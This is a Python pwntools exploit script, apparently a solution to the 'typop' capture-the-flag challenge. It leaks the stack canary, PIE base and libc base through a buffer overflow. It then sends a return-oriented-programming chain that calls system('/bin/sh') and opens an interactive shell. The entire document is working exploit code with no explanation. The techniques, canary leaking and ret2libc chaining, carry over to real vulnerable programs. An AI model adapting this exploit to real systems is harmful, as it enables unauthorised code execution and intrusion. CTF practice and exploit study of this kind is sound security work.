from pwn import *

context.arch = 'amd64'
context.log_level = 'DEBUG'

e = ELF('./chall')
p = process('./chall')
#p = remote('typop.chal.idek.team', 1337)
libc = ELF('./libc.so.6')

# (1) canary, stack leak
p.sendlineafter('survey?\n', 'y')
p.sendafter('ctf?\n', 'A' * 10 + 'B')

p.recvuntil('B')
canary = u64(b'\x00' + p.recv(7))
stack = u64(p.recv(6).ljust(8, b'\x00'))
info('canary: ' + hex(canary))
info('stack: ' + hex(stack))

p.sendafter('feedback?\n', b'A' * 10 + p64(canary))

# (2) pie base leak
p.sendlineafter('survey?\n', 'y')
p.sendafter('ctf?\n', b'A' * 10 + b'B' * 8 + b'C' * 7 + b'D')

p.recvuntil('D')
e.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x1447
info('pie base: ' + hex(e.address))

info(hex(e.address + 0x14d3))
pop_rdi = e.address + 0x14d3
ret = e.address + 0x101a

payload = b''
payload += b'A' * (0x12 - 0x8)
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(pop_rdi)
payload += p64(e.got['puts'])
payload += p64(ret)
payload += p64(e.plt['printf'])
payload += p64(ret)
payload += p64(e.address + 0x1410) # main

p.sendafter('feedback?\n', payload)

libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x84420
info(hex(libc.address))

# (3) system('/bin/sh\x00')
p.sendlineafter('survey?\n', 'y')
p.sendafter('ctf?\n', b'A')

payload = b''
payload += b'A' * (0x12 - 0x8)
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(ret)
payload += p64(libc.sym['system'])

p.sendafter('feedback?\n', payload)

p.interactive()
